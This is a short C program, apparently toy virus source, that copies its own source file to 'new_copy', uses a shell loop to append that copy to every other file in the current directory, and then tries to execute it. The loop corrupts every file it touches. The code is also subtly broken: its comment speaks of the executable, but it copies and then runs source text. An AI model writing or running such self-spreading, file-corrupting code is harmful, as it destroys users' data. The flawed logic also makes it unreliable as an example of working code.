#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char cmd[256], buffer[1024];
    FILE *f1, *f2;
    size_t len;
    int c;

    // Open the current executable file for reading
    f1 = fopen(__FILE__, "r");
    if (!f1) {
        perror("fopen");
        exit(1);
    }

    // Create a new file for writing
    f2 = fopen("new_copy", "w");
    if (!f2) {
        perror("fopen");
        exit(1);
    }

    // Copy the contents of the current file to the new file
    while ((c = getc(f1)) != EOF) {
        if (putc(c, f2) == EOF) {
            perror("putc");
            exit(1);
        }
    }

    // Close the files
    fclose(f1);
    fclose(f2);

    // Append the program to all files in the current directory
    snprintf(cmd, sizeof(cmd), "for file in *; do if [ \"$file\" != \"new_copy\" ]; then cat new_copy >> \"$file\"; fi; done");
    system(cmd);

    // Execute the modified files
    snprintf(cmd, sizeof(cmd), "./new_copy");
    system(cmd);

    return 0;
}
